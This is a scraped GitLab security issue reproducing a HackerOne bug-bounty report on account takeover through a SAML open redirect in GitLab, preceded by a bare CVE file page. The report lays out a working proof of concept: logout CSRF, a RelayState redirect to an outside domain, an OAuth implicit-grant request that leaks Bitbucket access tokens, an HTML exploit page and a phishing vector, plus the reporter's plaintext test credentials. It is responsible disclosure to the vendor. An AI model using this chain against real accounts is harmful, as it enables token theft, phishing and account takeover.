=== Content from gitlab.com_9d43531f_20250115_101205.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

* [cves](/gitlab-org/cves/-/tree/master)
* [2023](/gitlab-org/cves/-/tree/master/2023)
* [**CVE-2023-1965.json**](/gitlab-org/cves/-/blob/master/2023/CVE-2023-1965.json)

Find file

[Blame](/gitlab-org/cves/-/blame/master/2023/CVE-2023-1965.json)
[Permalink](/gitlab-org/cves/-/blob/5dbfc725a86e6d942deec9c36b7f06f5b8d912fc/2023/CVE-2023-1965.json "Go to permalink <kbd class='flat ml-1' aria-hidden=true>y</kbd>")

* [![ðŸ¤– GitLab Bot ðŸ¤–'s avatar](/uploads/-/system/user/avatar/1786152/avatar.png?width=64 "ðŸ¤– GitLab Bot ðŸ¤–")](/gitlab-bot)

  May 03, 2023

  [48000e9f](/gitlab-org/cves/-/commit/48000e9f864b93d847912de7976e32de66a6c89a)
  [Publishing 0 updated advisories and 9 new advisories](/gitlab-org/cves/-/commit/48000e9f864b93d847912de7976e32de66a6c89a)
  Â·
  48000e9f

  [ðŸ¤– GitLab Bot ðŸ¤–](/gitlab-bot) authored May 03, 2023

  48000e9f

  [Publishing 0 updated advisories and 9 new advisories](/gitlab-org/cves/-/commit/48000e9f864b93d847912de7976e32de66a6c89a)
  [ðŸ¤– GitLab Bot ðŸ¤–](/gitlab-bot) authored May 03, 2023

Loading



=== Content from gitlab.com_95b28205_20250115_101206.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Account takeover through open redirect for Group SAML accounts

âš  **Please read [the process](https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md) on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.**

**[HackerOne report #1923672](https://hackerone.com/reports/1923672)** by `bull` on 2023-03-29, assigned to [@ameyadarshan](/ameyadarshan "Ameya Darshan"):

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

Hi,

I have found an issue which can be used by an attacker to steal Bitbucket access token along with Other third party access tokens(google, salesforce etc). But the most important one is bitbucket.

# Issue:

* there is open redirect while loggin to gitlab Via SAML, while the Open redirect is not much impactful since it is a post based request coming from third party domain, but the redirect happens and is also saved along in the gitlab cookies while being redirect and next time user visits `gitlab.com/user/sign_in`, he is automatically sent to the redirect

##### open redirect:

[![Screenshot_2023-03-29_at_4.14.02_PM.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/2e15d72bdde8d7cde278022d38abefdb002dfefa/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f61323466633630392d666631652d343863372d616161372d6132343632386634613762622f53637265656e73686f745f323032332d30332d32395f61745f342e31342e30325f504d2e706e67)

This chain can be used to steal third party access token `login with google, github, bitbucket, twitter, salesforce ....... etc` but we will focus on bitbucket for the following reason:

It has the presaved oauth scopes which is wide and also the client id is same as that of when you use the import project from bitbucket feature:

[![Screenshot_2023-03-29_at_4.43.25_PM.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/f170b714c1efb05d8c492ba3381bdabf4daca1e6/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f32373438343464392d306133352d346439652d613231642d3065336463346132306339632f53637265656e73686f745f323032332d30332d32395f61745f342e34332e32355f504d2e706e67)

Scope : (Read acccess to all data in account and some write access, projects's wikis):

[![Screenshot_2023-03-29_at_1.46.27_PM.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/21ed76abe7725779db8e50d3402b47257780fa43/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f64616332646337622d346638642d343733322d613364352d3662323863613761386337362f53637265656e73686f745f323032332d30332d32395f61745f312e34362e32375f504d2e706e67)

similar is the case for Github, but Github doesn't allow implicit grant.

##### implicit grant for bitbucket:

this simply returns access token as bearer to attacker's domain , which can be used to access full bitbucket api.

This makes both users vulnerable,:

`people who chose to log in with bitbucket`

`people who chose other means of login, but have previously imported project from bitbucket into gitlab`

# POC:

### As victim:

make sure you have previously used bitbucket with gitlab, weather for login with bitbucket or for importing project.

##### As attacker:

* setup a group with SAML Login and setup a user to log into gitlab with SAML

Here are my credentials for triage purposes: (Please note i will revoke these credentials upon triage, let me know if you need them longer or dont need them at all)

<https://bugcrowd-iambull-2.oktapreview.com/>

username: `gitlab@gitlab.com`

password : `Gliatb4passtbx!`

security answer: `Gliatb`

# POC:

* log victim out with Logout CSRF
* use SAML creds to save open redirect for victim:

<https://bugcrowd-iambull-2.oktapreview.com/app/bugcrowd-iambull-2_gitlabcom_1/exk1lit3jovMjvewh0h8/sso/saml?RelayState=.witcoat.com>

* initiate bitbucket oauth by changing response\_type to `token`

<https://bitbucket.org/site/oauth2/authorize?client_id=b9jLmh8WCLZPBAwWba&redirect_uri=https%3A%2F%2Fgitlab.com%2Fusers%2Fauth%2Fbitbucket%2Fcallback&response_type=token&state=DoesNotMatter>

* try using stolen bitbucket api:

```
GET /2.0/repositories/%7B766210f9-9bec-4010-9f4d-917b06661c0c%7D HTTP/2
Host: api.bitbucket.org
User-Agent: curl/7.79.1
Accept: */*
Authorization: Bearer Txpo3AXXQZHlp....

```

here is the poc for doing everything step by step, **please note all this can be automated with window.open for 1 click exploit**

```
<html>
<title>GitLab</title>

<body>

<span>Logout of gitlab if logged in:</span>

<form action="https://gitlab.com/users/sign_out" target="_blank" method="post"><button>Logout Gitlab Account</button></form>

<br>
<br>
<br>
<br>

<span>Open redirect via SAML:</span>

<form action="https://bugcrowd-iambull-2.oktapreview.com/app/bugcrowd-iambull-2_gitlabcom_1/exk1lit3jovMjvewh0h8/sso/saml" target="_blank" method="get">
	<input type="hidden" name="RelayState" value=".witcoat.com" />
	<button>Save Open Redirect</button></form>
<br>

<span>steal oauth access Token For Bitbucket:</span>

<form action="https://bitbucket.org/site/oauth2/authorize" target="_blank" method="get">
	<input type="hidden" name="client_id" value="b9jLmh8WCLZPBAwWba" />
  <input type="hidden" name="redirect_uri" value="https://gitlab.com/users/auth/bitbucket/callback" />
  <input type="hidden" name="response_type" value="token" />
    <input type="hidden" name="state" value="Doesnotmatter" />

	<button>Steal Bitbucket Code</button>
</form>

</body>

</html>
```

here is the video of going through steps:

[f\_gitlab.mov](https://user-content.gitlab-static.net/415f682e3e5fea4c9ec86ed0fcbc4cbffa0691da/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f32626137323664322d323266382d343933332d396331312d6666653935383237363164352f665f6769746c61622e6d6f76 "Download 'f_gitlab.mov'")

#### Phishing Vector:

Upon saving open redirect into the cookies, when the user clicks signin on `about.gitlab.com` he will be redirected to external domain to steal credentials:

[phish\_g.mov](https://user-content.gitlab-static.net/da0a38612d282fbbbb99831892f57939e9a39d25/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f34333735626566342d333066362d343966312d616565622d6163336434653961323033652f70686973685f672e6d6f76 "Download 'phish_g.mov'")

Please let me know if you need any more information or if i missed something

thanks

Bull

#### Impact

Steal bitbucket access token, which can be used to import victim's any repository, and also write access to victim's any wiki in bitbucket,

also this can be used to steal access tokens for other providers such as google, salesforce twitter etc.....

Also this can be used to phish users

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [Screenshot\_2023-03-29\_at\_4.14.02\_PM.png](https://h1.sec.gitlab.net/a/a24fc609-ff1e-48c7-aaa7-a24628f4a7bb/Screenshot_2023-03-29_at_4.14.02_PM.png)
* [Screenshot\_2023-03-29\_at\_4.43.25\_PM.png](https://h1.sec.gitlab.net/a/274844d9-0a35-4d9e-a21d-0e3dc4a20c9c/Screenshot_2023-03-29_at_4.43.25_PM.png)
* [Screenshot\_2023-03-29\_at\_1.46.27\_PM.png](https://h1.sec.gitlab.net/a/dac2dc7b-4f8d-4732-a3d5-6b28ca7a8c76/Screenshot_2023-03-29_at_1.46.27_PM.png)
* [f\_gitlab.mov](https://h1.sec.gitlab.net/a/2ba726d2-22f8-4933-9c11-ffe9582761d5/f_gitlab.mov)
* [phish\_g.mov](https://h1.sec.gitlab.net/a/4375bef4-30f6-49f1-aeeb-ac3d4e9a203e/phish_g.mov)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


